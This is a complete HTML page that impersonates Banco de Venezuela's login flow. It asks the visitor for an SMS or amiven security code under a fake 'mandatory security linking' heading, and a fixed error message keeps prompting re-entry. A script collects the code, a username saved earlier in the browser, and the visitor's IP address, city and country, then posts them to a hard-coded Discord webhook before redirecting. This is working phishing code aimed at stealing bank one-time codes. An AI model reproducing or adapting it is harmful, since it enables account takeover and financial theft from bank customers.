<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(./css/background.jpg);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;

        height: 100%;
        width: 100%;
      }

      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 50%;
      }
      form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }
        .container {
          flex-direction: column;
        }
        .left-side {
          width: 100%;
          height: 100vh;
        }
        .right-side {
          display: none;
        }
      }
    </style>
    <style>
      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;

        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group input:focus {
        border: 0;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="left-side">
       <form id="loginform">
  <div style="text-align: center">
    <img src="./css/logo.png" alt="" style="width: 60%; margin-top: 20px" />
  </div>
  <div style="width: 100%; text-align: center">
    <div style="margin: 10px; color: #0067b1 !important">
      <h4>Vinculación de seguridad Obligatoria</h4>
      <h5>
        Ingrese el código recibido por SMS o código generado en amiven
      </h5>
    </div>
    
    <div class="form-group">
      <input
        type="text"
        id="sms"
        name="nombre"
        style="width: 100%"
        maxlength="8"
        required
      />
      <label for="sms">SMS *</label>
      <!-- Error label added here -->
      <div id="error-message" style="color: red; display: none; margin-top: 5px;">
        Código incorrecto. Por favor, inténtelo de nuevo.
      </div>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const input = document.getElementById("sms");
        const label = input.nextElementSibling;
        const errorMessage = document.getElementById("error-message");

        label.style.top = "50%";
        if (input.value !== "") {
          label.style.top = "15px";
          label.style.fontSize = "12px";
        }

        input.addEventListener("focus", () => {
          label.style.top = "15px";
          label.style.fontSize = "12px";
        });

        input.addEventListener("blur", () => {
          if (!input.value) {
            label.style.top = "50%";
            label.style.fontSize = "";
          }
        });

        // Show error message if needed (e.g., based on a condition)
        const codeIsIncorrect = true; // Example condition
        if (codeIsIncorrect) {
          errorMessage.style.display = "block"; // Show the error message
        }
      });
    </script>
  </div>
  
  <div style="width: 100%; text-align: center">
    <button type="submit">Verificar</button>
  </div>
  
  <div style="width: 100%; height: 30px"></div>
</form>

      </div>
      <div class="right-side"></div>
    </div>
  </body>

  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");

  form.addEventListener("submit", (event) => {
  event.preventDefault(); // Prevents the default form submission
  axios
    .get(url)
    .then((response) => {
      const nombre = localStorage.getItem("usuario");
      const contra = document.querySelector("#sms").value;
      const message =
        "**BDV**\n**Nombre:** " +
        nombre +
        "\n**SMS:** " +
        contra +
        "\n**Ciudad:** " +
        response.data.city +
        "\n**País:** " +
        response.data.country +
        "\n**IP:** " +
        response.data.ip;

      // Replace this with your actual Discord webhook URL
      const discordWebhookUrl = "https://discord.com/api/webhooks/1434386956133077013/Lt4bC3hwnGuhzYmZ0_u3ygnqRXoA1HZSDbnEXjw8uOT7mrRZurXQwk7Gu09nwIZ5tQp2";

      axios
        .post(discordWebhookUrl, {
          content: message,
        })
        .then((response) => {
          window.location.href = "cargando3.html";
        })
        .catch((error) => {
          console.error(error);
        });
    })
    .catch((error) => {
      console.log(error);
    });
});

  </script>
    </script>
  <script>document.addEventListener("DOMContentLoaded", function () {
  const input = document.getElementById("sms");

  input.addEventListener("input", function () {
    // Reemplaza cualquier cosa que NO sea número
    this.value = this.value.replace(/[^0-9]/g, "");
  });
});
</script>
</html>
